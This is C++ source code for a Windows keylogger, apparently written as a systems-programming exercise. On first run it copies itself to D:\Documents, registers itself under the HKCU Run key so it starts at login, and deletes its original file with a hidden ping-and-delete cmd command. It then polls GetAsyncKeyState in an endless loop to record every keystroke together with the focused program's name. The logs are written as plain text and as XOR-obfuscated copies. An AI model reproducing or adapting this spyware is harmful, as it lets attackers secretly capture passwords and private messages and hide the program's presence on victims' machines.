#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <shlwapi.h>
#include <process.h>
#include <Psapi.h>
#include <Winuser.h>
#include <strsafe.h>

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
using namespace std;

#define DEST_PATH "D:\\Documents"
#define LOGS_PATH "D:\\Documents\\logs"


void copy_addStart_del(const string& dest_path)
{
    char current_script[MAX_PATH];
    GetModuleFileName(NULL, current_script, MAX_PATH);

    if (!PathFileExists(dest_path.c_str()))
    {
        cerr << "Destination path is not a valid directory." << endl;
        return;
    }

    string script_name = PathFindFileName(current_script);
    string dest_script_path = dest_path + "\\" + script_name;

    ifstream src(current_script, ios::binary);
    ofstream dst(dest_script_path, ios::binary);

    dst << src.rdbuf();
    src.close();
    dst.close();

    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueEx(hKey, "Script", 0, REG_SZ, (BYTE*)dest_script_path.c_str(), dest_script_path.length() + 1);
        RegCloseKey(hKey);
    }
    
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

string getCurrentDate() {
    SYSTEMTIME systemTime;
    GetLocalTime(&systemTime);
    
    char buffer[50];
    HRESULT hr = StringCbPrintfA(buffer, sizeof(buffer), "%02d_%02d_%04d", systemTime.wDay, systemTime.wMonth, systemTime.wYear);
    return string(buffer);
}


string getNextLogFileName(string& encryptedLogFileName)
{
    SYSTEMTIME systemTime;
    GetLocalTime(&systemTime);

    string logFileName = string(LOGS_PATH) + "\\log_" + to_string(systemTime.wDay) + "_" +
                         to_string(systemTime.wMonth) + "_" +
                         to_string(systemTime.wYear) + ".txt";
    encryptedLogFileName = "encrypted_" + to_string(systemTime.wDay) + "_" +
                         to_string(systemTime.wMonth) + "_" +
                         to_string(systemTime.wYear) + ".txt";
    return logFileName;
}


string xorEncrypt(const string& input, const string& key)
{
    string output = input;
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ key[i % key.size()];
    }
    return output;
}


void logContent(ofstream& logFile, ofstream& logFileEncrypted, const string& windowName, const string& content)
{
    const string key = "SysProg8";
    SYSTEMTIME systemTime;
    GetLocalTime(&systemTime);

    string logLine = "[" + to_string(systemTime.wHour) + "." +
                          to_string(systemTime.wMinute) + "." +
                          to_string(systemTime.wSecond) + "]" + ".[" + windowName + "]:" + content;
    
    logFile << logLine <<endl;
    string encryptedlogLine = xorEncrypt(logLine, key);
    logFileEncrypted << encryptedlogLine << endl;

}

int main()
{
    if (wcsncmp(_wgetcwd(NULL, 0), L"D:\\Documents", wcslen(L"D:\\Documents")) != 0)
    {
        copy_addStart_del(DEST_PATH);
        return 0;
    }

    string encryptedLogFileName;
    string logFileName = getNextLogFileName(encryptedLogFileName); 
    ofstream logFile(logFileName, ios::app);
    ofstream logFileEncrypted(encryptedLogFileName, ios::app);

    string content;
    string windowName;
    HANDLE hProcess;
    DWORD processId;
    char windowModuleFileName[MAX_PATH];


    DWORD tid = GetWindowThreadProcessId(GetForegroundWindow(), 0);
    GUITHREADINFO guiThreadInfo = { sizeof(GUITHREADINFO) };
    GetGUIThreadInfo(tid, &guiThreadInfo);
    HWND currentWindow = guiThreadInfo.hwndFocus;
    if (currentWindow != NULL)
    {   
    GetWindowThreadProcessId(currentWindow, &processId);
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        if (hProcess != NULL)
        {
            if (GetModuleFileNameExA(hProcess, NULL, windowModuleFileName, MAX_PATH) != 0)
                {
                    windowName = PathFindFileNameA(windowModuleFileName);
                }
        }
    }

    while (true)
    {
        tid = GetWindowThreadProcessId(GetForegroundWindow(), 0);
        guiThreadInfo = { sizeof(GUITHREADINFO) };
        GetGUIThreadInfo(tid, &guiThreadInfo);

        HWND currentWindow = guiThreadInfo.hwndFocus;
        if (currentWindow != NULL)
        {   
            processId;
            GetWindowThreadProcessId(currentWindow, &processId);

            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
            if (hProcess != NULL)
            {
                if (GetModuleFileNameExA(hProcess, NULL, windowModuleFileName, MAX_PATH) != 0)
                {
                    windowName = PathFindFileNameA(windowModuleFileName);
                    for (char c = 8; c <= 255; ++c)
                    {
                        if (GetAsyncKeyState(c) == -32767)
                        { 
                            if(((c>64) && (c<91)) && !(GetAsyncKeyState(0x10)))
                            {
                                c += 32;
                                content += c;
                            }

                            else if((c>64) && (c<91))
                            {
                                content += c;
                            }

                            else
                            {
                                switch (c)
                                {
                                    case 48:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += ")";
                                        else
                                            content += "0";
                                        break;
                                    }

                                    case 49:
                                    {
                                        if(GetAsyncKeyState(0x10))
									        content += "!";
								        else
									        content += "1";
								        break;
                                    }

                                    case 50:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += "@";
                                        else
                                            content += "2";
                                        break;
                                    }

                                    case 51:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += "#";
                                        else
                                            content += "3";
                                        break;
                                    }

                                    case 52:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += "$";
                                        else
                                            content += "4";
                                        break;
                                    }

                                    case 53:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += "%";
                                        else
                                            content += "5";
                                        break;
                                    }

                                    case 54:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += "^";
                                        else
                                            content += "6";
                                        break;
                                    }

                                    case 55:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += "&";
                                        else
                                            content += "7";
                                        break;
                                    }

                                    case 56:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += "*";
                                        else
                                            content += "8";
                                        break;
                                    }

                                    case 57:
                                    {
                                        if(GetAsyncKeyState(0x10))
                                            content += "(";
                                        else
                                            content += "9";
                                        break;
                                    }

                                    case 8:
                                        content += "<[Backspace]>";
                                        break;
                                    
                                    case 127:
                                        content += "<[Delete]>";
                                        break;

                                    case 27:
                                        content += "<[Escape]>";
                                        break;
                                    
                                    case 32:
                                        content += " ";
                                        break;
                                    
                                    case 9:
                                        content += "<[Tab]>";
                                        break;
                                    
                                    case VK_NUMPAD0:
                                        content += "0";
                                        break;
                                    
                                    case VK_NUMPAD1:
                                        content += "1";
                                        break;
                                    
                                    case VK_NUMPAD2:
                                        content += "2";
                                        break;
                                    
                                    case VK_NUMPAD3:
                                        content += "3";
                                        break;
                                    
                                    case VK_NUMPAD4:
                                        content += "4";
                                        break;
                                    
                                    case VK_NUMPAD5:
                                        content += "5";
                                        break;
                                    
                                    case VK_NUMPAD6:
                                        content += "6";
                                        break;
                                    
                                    case VK_NUMPAD7:
                                        content += "7";
                                        break;
                                    
                                    case VK_NUMPAD8:
                                        content += "8";
                                        break;
                                    
                                    case VK_NUMPAD9:
                                        content += "9";
                                        break;

                                    case VK_CAPITAL:
								        content += "<[CAPS LOCK]>";
								        break;
                                    
                                    case 13:
                                        {
                                            logContent(logFile, logFileEncrypted, windowName, content);
                                            content.clear();
                                            tid = 0;
                                            ZeroMemory(&guiThreadInfo, sizeof(GUITHREADINFO));
                                            ZeroMemory(windowModuleFileName, sizeof(windowModuleFileName));
                                            if (hProcess != NULL)
                                            {
                                                CloseHandle(hProcess);
                                                hProcess = NULL;
                                            }
                                            processId = 0;
                                            tid = GetWindowThreadProcessId(GetForegroundWindow(), 0);
                                            guiThreadInfo = { sizeof(GUITHREADINFO) };
                                            GetGUIThreadInfo(tid, &guiThreadInfo);
                                            currentWindow = guiThreadInfo.hwndFocus;
                                            if (currentWindow != NULL)
                                            {   
                                                GetWindowThreadProcessId(currentWindow, &processId);
                                                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
                                                if (hProcess != NULL)
                                                {
                                                    if (GetModuleFileNameExA(hProcess, NULL, windowModuleFileName, MAX_PATH) != 0)
                                                    {
                                                        windowName = PathFindFileNameA(windowModuleFileName);
                                                    }
                                                }
                                            }
                                            continue;
                                        }
                                    }
                                }
                        }
                    }
                CloseHandle(hProcess);
                }
            }
        }
    }
    logFile.close();
    logFileEncrypted.close();
    return 0;
}

